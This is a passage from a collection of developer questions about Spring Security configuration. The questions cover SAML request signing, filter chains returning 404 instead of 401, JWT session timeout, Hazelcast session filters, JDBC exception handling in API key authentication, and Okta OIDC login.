        return new InMemoryRelyingPartyRegistrationRepository(registration);
    }
</code></pre>
<p>Clearly, this doesn't work because my private key is not a certificate. But how do I add my private key? I have already generated the private / public key pair.</p>
<p>Initially, my app was on a staging server and the requests didn't need to be signed, so all I used was the asserting party's public key. Now I'm moving the app to the production server, and the new metadata for the idp shows that my requests must be signed. Basically, I've duplicated the logic for the asserting party's public key for my private key in this example to show that 1) I have no idea what I'm doing and 2) I do realize I need to add my private key in some way and that the authentication requests must be signed.</p>
<p>Help?</p>
"
"<p>I have a springboot app, and I'm trying to create two filters, one for the API and another one for the GUI, that's why I'm using &quot;securityMatcher&quot;. Right now I am testing with the api filter only.</p>
<p>When I send a request with the correct credentials, it works just fine. But when I send invalid credentials or I do not include the authentication I get a 404, as if the endpoint didn't exist, instead of a 403/401. It seems as if it was falling trough the filter without being intercepted properly. As for what I understand, the securityMatcher should intercept this request (since it is for /api/something) and if it is not authenticated reply a 403 right away instead of continuing down the rest of the filters, am I mistaken?</p>
<p><strong>This is my filter config:</strong></p>
<pre><code>@Bean
public SecurityFilterChain apiSecurityFilterChain(HttpSecurity http) throws Exception{
    http
        .securityMatcher(&quot;/api/**&quot;)
        .csrf(csrf-&gt;csrf.disable())
        .authorizeHttpRequests(
            configurer -&gt; configurer
                    .anyRequest().authenticated()
        )
        .httpBasic(Customizer.withDefaults());
    return http.build();
}
</code></pre>
<p><strong>This is the trace when I send an unauthenticated request:</strong></p>
<pre><code>2024-03-07T14:07:38.852-03:00  INFO 4016 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 1 ms
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Trying to match request against DefaultSecurityFilterChain [RequestMatcher=Or [Mvc [pattern='/api/**']], Filters=[org.springframework.security.web.session.DisableEncodeUrlFilter@54052db, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@648d6e28, org.springframework.security.web.context.SecurityContextHolderFilter@6e5c0033, org.springframework.security.web.header.HeaderWriterFilter@28c8caa6, org.springframework.web.filter.CorsFilter@345b636a, org.springframework.security.web.authentication.logout.LogoutFilter@18dbee52, org.springframework.security.web.authentication.www.BasicAuthenticationFilter@422e9db2, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3083f3b9, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@78fb417b, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@22ebb5e, org.springframework.security.web.access.ExceptionTranslationFilter@7d16b4d6, org.springframework.security.web.access.intercept.AuthorizationFilter@1538a7d4]] (1/1)
2024-03-07T14:07:38.853-03:00 DEBUG 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Securing POST /api/telemetry
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking DisableEncodeUrlFilter (1/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking WebAsyncManagerIntegrationFilter (2/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking SecurityContextHolderFilter (3/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking HeaderWriterFilter (4/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking CorsFilter (5/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking LogoutFilter (6/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.w.a.logout.LogoutFilter            : Did not match request to Or [Ant [pattern='/logout', GET], Ant [pattern='/logout', POST], Ant [pattern='/logout', PUT], Ant [pattern='/logout', DELETE]]
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking BasicAuthenticationFilter (7/12)
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.w.a.www.BasicAuthenticationFilter  : Found username 'admin' in Basic Authorization header
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] w.c.HttpSessionSecurityContextRepository : Did not find SecurityContext in HttpSession A55EEDF1AE9AC3C5428BA15A466F010C using the SPRING_SECURITY_CONTEXT session attribute
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] .s.s.w.c.SupplierDeferredSecurityContext : Created SecurityContextImpl [Null authentication]
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] .s.s.w.c.SupplierDeferredSecurityContext : Created SecurityContextImpl [Null authentication]
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.authentication.ProviderManager     : Authenticating request with DaoAuthenticationProvider (1/1)
2024-03-07T14:07:39.012-03:00 DEBUG 4016 --- [nio-8080-exec-1] o.s.s.a.dao.DaoAuthenticationProvider    : Failed to authenticate since password does not match stored value
2024-03-07T14:07:39.014-03:00 DEBUG 4016 --- [nio-8080-exec-1] o.s.s.w.a.www.BasicAuthenticationFilter  : Failed to process authentication request

org.springframework.security.authentication.BadCredentialsException: Bad credentials
    at org.springframework.security.authentication.dao.DaoAuthenticationProvider.additionalAuthenticationChecks(DaoAuthenticationProvider.java:89) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.authentication.dao.AbstractUserDetailsAuthenticationProvider.authenticate(AbstractUserDetailsAuthenticationProvider.java:147) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:182) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:201) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilterInternal(BasicAuthenticationFilter.java:187) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:340) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1744) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at java.base/java.lang.Thread.run(Thread.java:833) ~[na:na]

2024-03-07T14:07:39.018-03:00 DEBUG 4016 --- [nio-8080-exec-1] s.w.a.DelegatingAuthenticationEntryPoint : Trying to match using RequestHeaderRequestMatcher [expectedHeaderName=X-Requested-With, expectedHeaderValue=XMLHttpRequest]
2024-03-07T14:07:39.018-03:00 DEBUG 4016 --- [nio-8080-exec-1] s.w.a.DelegatingAuthenticationEntryPoint : No match found. Using default entry point org.springframework.security.web.authentication.www.BasicAuthenticationEntryPoint@39a54a32
2024-03-07T14:07:39.018-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.w.header.writers.HstsHeaderWriter  : Not injecting HSTS header since it did not match request to [Is Secure]
2024-03-07T14:07:39.019-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Trying to match request against DefaultSecurityFilterChain [RequestMatcher=Or [Mvc [pattern='/api/**']], Filters=[org.springframework.security.web.session.DisableEncodeUrlFilter@54052db, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@648d6e28, org.springframework.security.web.context.SecurityContextHolderFilter@6e5c0033, org.springframework.security.web.header.HeaderWriterFilter@28c8caa6, org.springframework.web.filter.CorsFilter@345b636a, org.springframework.security.web.authentication.logout.LogoutFilter@18dbee52, org.springframework.security.web.authentication.www.BasicAuthenticationFilter@422e9db2, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3083f3b9, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@78fb417b, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@22ebb5e, org.springframework.security.web.access.ExceptionTranslationFilter@7d16b4d6, org.springframework.security.web.access.intercept.AuthorizationFilter@1538a7d4]] (1/1)
2024-03-07T14:07:39.019-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : No security for POST /error
</code></pre>
"
"<p>I am building a RESTful service where where the user registers and login's in to the account and all the REST endpoint after logging in require a JWT bearer token to be authenticated, so basically I would have a access token and refresh token that would help me maintain the session. I have a backend written in Java where I have a MySQL database that holds the access token of the logged in user. Now it works all fine, and when logging out it basically deletes the token from database and redirects to the login page.
Now if I have to logout when the user is inactive for a period of time how do I do this? I would have to delete the token in the database as well and if the token expires I could not even do that which is a major bug in the project. Are there any solutions to this problem?</p>
<p>note: This is written in Java version 17 without XML configuration. And only by using annotations.</p>
<p>I tried to set a timer in the react app and hit the logout api when the timer ticks. But how do I do this in a different approach is there a way to do this in backend service and let the front end redirect to logout after deleting the token from database?</p>
"
"<p>I'm using Hazelcast to store user sessions. Requests pass through the <code>SessionRepositoryFilter</code>, but if there's an error then the request is forwarded to <em>/error</em>. The forwarded request does not pass through that filter, so tomcat creates a new session with a new ID (not a UUID like the Hazelcast session ID), and responds with a set-cookie header telling the client to change their session ID to this new, wrong one. When the client makes its next request, Hazelcast does not recognise the tomcat session ID and so responds 401 unauthorized.</p>
<p>Spring's <a href=""https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot/src/main/java/org/springframework/boot/web/servlet/AbstractFilterRegistrationBean.java#L169"" rel=""nofollow noreferrer""><code>AbstractFilterRegistrationBean#determineDispatcherTypes</code> method</a> decides that <code>SessionRepositoryFilter</code> should not be applied to forwarded requests because it is not an instance of <code>org.springframework.web.filter.OncePerRequestFilter</code>. It is instead an instance of <a href=""https://github.com/spring-projects/spring-session/blob/main/spring-session-core/src/main/java/org/springframework/session/web/http/OncePerRequestFilter.java"" rel=""nofollow noreferrer""><code>org.springframework.session.web.http.OncePerRequestFilter</code></a>. I think that might be a bug - they should both filter on all dispatch types.</p>
<p>How can I edit the dispatcherMapping of the <code>SessionRepositoryFilter</code> <code>FilterMap</code> to 31, i.e. filter all requests?</p>
"
"<p>I'm building a rest api server with spring boot and I'm using jdbcTemplate as API key validation for requests. Next is the implementation class that inherited the Authentication Manager that I defined.</p>
<pre><code>@Component
public class ApiKeyAuthManager implements AuthenticationManager {

    private final DataSource dataSource;

    @Autowired
    public ApiKeyAuthManager(DataSource dataSource){
        this.dataSource = dataSource;
    }

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException,CannotGetJdbcConnectionException {
        String principal = (String) authentication.getPrincipal();


        try {
            JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource);
            String query = &quot;SELECT COUNT(*) FROM apikey WHERE key = ? AND to_char(current_timestamp, 'YYYYMMDDHH24MISS') &lt; exprt_date AND exprt_yn != 'Y'&quot;;

            int count = jdbcTemplate.queryForObject(query, Integer.class, principal);

            if(count &gt; 0){
                authentication.setAuthenticated(true);
            }else{
                throw new BadCredentialsException(&quot;&quot;);
            };
        } catch (CannotGetJdbcConnectionException e) {
            throw e;
        }
        return authentication;
    }
}
</code></pre>
<p>Next, a class code that implements an Authentication EntryPoint interface to handle responses to authentication failures.</p>
<pre><code>@Configuration
public class CustomAuthenticationEntryPoint implements AuthenticationEntryPoint {

    Logger logger = LoggerFactory.getLogger(CustomAuthenticationEntryPoint.class);

    @Override
    public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException {

        logger.error(&quot;message&quot;, authException);

        ApiErrorResponse responseBody = new ApiErrorResponse(ApiResponseConstants.STATUS_ERROR, ApiResponseConstants.MESSAGE_API_ACCESS_DENIED, null);

        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        response.setStatus(HttpStatus.UNAUTHORIZED.value());
        response.setCharacterEncoding(&quot;UTF-8&quot;);
        response.getWriter().write(new ObjectMapper().writeValueAsString(responseBody));
    }
}
</code></pre>
<p>Next, the handler code for creating and returning custom responses for each exception.</p>
<pre><code>@RestControllerAdvice
public class CustomGlobalExceptionHandler {

    Logger logger = LoggerFactory.getLogger(CustomGlobalExceptionHandler.class);

    @ExceptionHandler(CannotGetJdbcConnectionException.class)
    public ResponseEntity&lt;Object&gt; handleCannotGetJdbcConnectionException(CannotGetJdbcConnectionException exception) {
        return ResponseEntity.status(400).body(new ApiErrorResponse(ApiResponseConstants.STATUS_FAIL, exception.getMessage(), null));
    }
}
</code></pre>
<p>Finally, this is the DefaultErrorAttributes class for customizing basic response types for non-exception errors.</p>
<pre><code>@Component
public class CustomErrorAttributes extends DefaultErrorAttributes {

    Logger logger = LoggerFactory.getLogger(CustomErrorAttributes.class);

    @Override
    public Map&lt;String, Object&gt; getErrorAttributes(WebRequest webRequest, ErrorAttributeOptions options) {

        Map&lt;String, Object&gt; result = super.getErrorAttributes(webRequest, options.excluding(ErrorAttributeOptions.Include.STACK_TRACE));

        Exception ex = (Exception) webRequest.getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.EXCEPTION&quot;,0);
        logger.error(&quot;message&quot;, ex);

        Map&lt;String, Object&gt; resultBody = new LinkedHashMap&lt;&gt;();
        resultBody.put(&quot;status&quot;, ApiResponseConstants.STATUS_ERROR);
        resultBody.put(&quot;message&quot;, result.get(&quot;message&quot;));
        resultBody.put(&quot;detail&quot;, null);

        return resultBody;
    }
}
</code></pre>
<p>I registered the above settings in the spring security config.</p>
<pre><code>@Bean
@Order(1)
public SecurityFilterChain apiSecurityfilterChain(HttpSecurity http) throws Exception {

    apiKeyAuthFilter.setAuthenticationManager(new ApiKeyAuthManager(dataSource));

    http.antMatcher(&quot;/api/**&quot;)
            .csrf().disable()
            .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            .and()
                .addFilter(apiKeyAuthFilter).authorizeRequests()
                .anyRequest().authenticated()
            .and()
                .exceptionHandling()
                .authenticationEntryPoint(customAutehticationEntryPoint);

    return http.build();
}

@Bean
@Order(2)
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {

    http.authorizeRequests()
            .antMatchers(&quot;/login&quot;).permitAll()
            .anyRequest().authenticated()
            .and()
                .formLogin()
                .loginPage(&quot;/login&quot;)
                .loginProcessingUrl(&quot;/loginprocess&quot;)
                .defaultSuccessUrl(&quot;/&quot;)
                .failureUrl(&quot;/login?auth=fail&quot;)
            .and()
                .logout()
                .logoutSuccessUrl(&quot;/login&quot;)
                .permitAll()
            .and()
                .csrf().disable();

    return http.build();
}
</code></pre>
<p>I wanted to let you know that DB connection is the cause of DB connection by error message about rest request when DB is disconnected or wrong connection is established. So, I deliberately intended to make connection error by setting JDBC connection information of application.properties differently, and I was able to catch CannotGetJdbcConnectionException as expected.</p>
<p>I expected this Exception to be handled by one handler and create a custom response. However, none of the handlers (ExceptionHandler, DefaultErrorAttributes, etc.) handled the exception, and the server returned the login page html in response.</p>
<p><a href=""https://i.stack.imgur.com/a7TPD.png"" rel=""nofollow noreferrer"">postman</a></p>
<p>Perhaps my prediction is that due to the setting of the level or level of handling exceptions in Spring, the exception was propagated to the servlet stage and returned the login page due to authority for reasons such as conflict with the spring security setting, etc.</p>
<p>How can we resolve this situation?
How to return an Exception that occurred in jdbcTemplate as a custom response to user requests? How can I control this exception?</p>
"
"<p>I have a spring boot project with JWT being used for Spring Security. I want to implement Access Management in my project and I'm using this approach. In my project, whenever a user is created, a list of Departments is assigned to to the user. The user should be able to view and edit data that is related to the departments that have been assigned to them. I have implemented this using the below code, where the class &quot;Department&quot; is the Master data. A list of &quot;assigned&quot; Departments is associated with each User.</p>
<pre><code>public class User implements UserDetails {
  private static final long serialVersionUID = 1L;
  @Id
  @GeneratedValue(strategy = GenerationType.UUID)
  private UUID id;

  private String username;

  private String password;

  @JsonManagedReference
  @OneToMany(cascade = CascadeType.ALL, mappedBy = &quot;user&quot;, fetch = FetchType.EAGER)
  private List&lt;AssignedDepartment&gt; assignedDepartmentList = new ArrayList&lt;&gt;();

  public void setAssignedDepartment(List&lt;AssignedDepartment&gt; assignedDepartmentList1) {
    for(AssignedDepartment assignedDepartment : assignedDepartmentList1) {
      assignedDepartment.setUser(this);
      this.assignedDepartmentList.add(assignedDepartment);
    }
  }
}
</code></pre>
<pre><code>public class AssignedDepartment {
    @Id
    @GeneratedValue(strategy= GenerationType.IDENTITY)
    private Integer id;

    @JsonBackReference
    @ManyToOne
    @JoinColumn(name = &quot;username&quot;, referencedColumnName = &quot;username&quot;, nullable = false)
    private User user;

    @ManyToOne
    @JoinColumn(name = &quot;department_code&quot;, referencedColumnName = &quot;departmentCode&quot;)
    private Department department;
}
</code></pre>
<pre><code>public class Department implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    private String departmentCode;

    private String departmentName;
}
</code></pre>
<p>Considering the above implementation and approach and the below code, where I'm getting the list of assigned Departments from the JWT token (passed as a Bearer token) that is passed in the API request, is my implementation correct and safe? <strong>The below function is called every time any API is getting hit</strong>. I have tested the code and it works fine. The list of departments is always being fetched correctly based on the JWT token that I sent in the API request. I just want to confirm if there are any issues that might arise from this approach.</p>
<pre><code>private List&lt;String&gt; getListOfDepartmentsAssignedToCurrentUser() throws Exception {
    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();

    if(authentication == null || !authentication.isAuthenticated()) {
        throw new Exception(&quot;Unable to get departments for current user with authentication details: &quot; + authentication);
    }

    try {
        List&lt;AssignedDepartment&gt; userAssignedDepartments = ((User) authentication.getPrincipal()).getUserAssignedDepartments();
        return userAssignedDepartments.stream()
                .map(m -&gt; m.getDepartment().getDepartmentCode())
                .collect(Collectors.toList());
    } catch (Exception e) {
        throw new Exception(&quot;Error while streaming departments for current user with Exception: &quot; + e.toString());
    }
}
</code></pre>
"
"<p>I am following this example to secure application without springboot <a href=""https://developer.okta.com/blog/2018/09/12/secure-java-ee-rest-api"" rel=""nofollow noreferrer"">spring mvc + spring security with Okta login without springboot</a></p>
<p>When I login to the http://localhost:8080/myappContext/ it takes me to Okta logic screen. I enter either one of the user in assign list and click &quot;sign in&quot; it signs in then shows following error.</p>
<p><a href=""https://i.stack.imgur.com/oJj5N.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/oJj5N.jpg"" alt=""enter image description here"" /></a></p>
<p>any help is appreciated.</p>
<p><strong>Following is my Okta application configuration</strong></p>
<p>I have Okta developer account application is setup as web application with oidc,</p>
<ol>
<li>client authentication is &quot;client secret&quot;.</li>
<li>Grant type is (&quot;Client credentials&quot;, &quot;authorization code&quot;, implicit(hybrid) -&gt; allow             id token with implicit grant type, allow access token with implicit grant type)</li>
<li>sign in direct uri is &quot;http://localhost:8080/myappContext/login/oauth2/code/okta</li>
<li>signet redirect uri is &quot;http://localhost:8080/myappContext&quot;</li>
<li>login initiated by &quot;App only&quot;</li>
<li>Federation Broker Mode is disabled.</li>
<li>Okta api scopes granted none.</li>
<li>user assignments user1 and user 2 (2 users)</li>
<li>Groups: every one</li>
</ol>
<p><strong>Following is my code detail</strong></p>
<pre><code>Spring 5 security with OIDC login for Okta.
spring-framework version 5.3.x
spring security version 5.6.x
</code></pre>
<p>#SecurityWebApplicationInitializer.java#</p>
<pre><code>public class SecurityWebApplicationInitializer
   extends AbstractSecurityWebApplicationInitializer {

   public SecurityWebApplicationInitializer() {
       super(SecurityConfiguration.class);
   }
}
</code></pre>
<p>#application.properties#</p>
<pre><code>okta.client-id={clientId}
okta.client-secret={clientSecret}
okta.issuer-uri=https://{yourOktaDomain}/oauth2/default
</code></pre>
<p>#SecurityConfiguration.java#</p>
<pre><code>@Configuration
@EnableWebSecurity
@PropertySource(&quot;classpath:application.properties&quot;)
public class SecurityConfiguration extends WebSecurityConfigurerAdapter {
    private final String clientSecret;
    private final String clientId;
    private final String issuerUri;

    @Autowired
    public SecurityConfiguration(@Value(&quot;${okta.issuer-uri}&quot;) String issuerUri,
            @Value(&quot;${okta.client-id}&quot;) String clientId,
            @Value(&quot;${okta.client-secret}&quot;) String clientSecret) {
        this.issuerUri = issuerUri;
        this.clientId = clientId;
        this.clientSecret = clientSecret;
    }

@Override
   protected void configure(HttpSecurity http) throws Exception {
      http
            .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.ALWAYS)
                .and()
           .authorizeRequests()
               .anyRequest().authenticated()
               .and()
           .oauth2Login();
   }

   @Bean
   public OAuth2AuthorizedClientService authorizedClientService() {
       return new InMemoryOAuth2AuthorizedClientService(clientRegistrationRepository());
   }

  

   @Bean
    public ClientRegistrationRepository clientRegistrationRepository() {
        ClientRegistration okta = getRegistration();
        return new InMemoryClientRegistrationRepository(okta);
    }

    public ClientRegistration getRegistration(){
    
      ClientRegistrations.fromOidcIssuerLocation(Objects.requireNonNull(issuerUri))
            .registrationId(&quot;okta&quot;)
            .clientId(clientId)
            .clientSecret(clientSecret)
            .build();
    }
}
</code></pre>
<p>#My controller#</p>
<pre><code>public class SecureController{

@RequestMapping(&quot;/&quot;)
public String authenticated(Principal user){
   return &quot;home&quot;;
}

@RequestMapping(&quot;/login/oauth2/code/okta&quot;)
public String callback(Principal user){
  retur &quot;authenticated&quot;
}
}
</code></pre>
"
"<p><strong>Software versions</strong></p>
<ul>
<li>Spring Boot and dependencies: 3.2.2</li>
<li>Spring Core : 6.1.3</li>
<li>Spring Security 6.2.1</li>
<li>Jetty Server: 11.0.20</li>
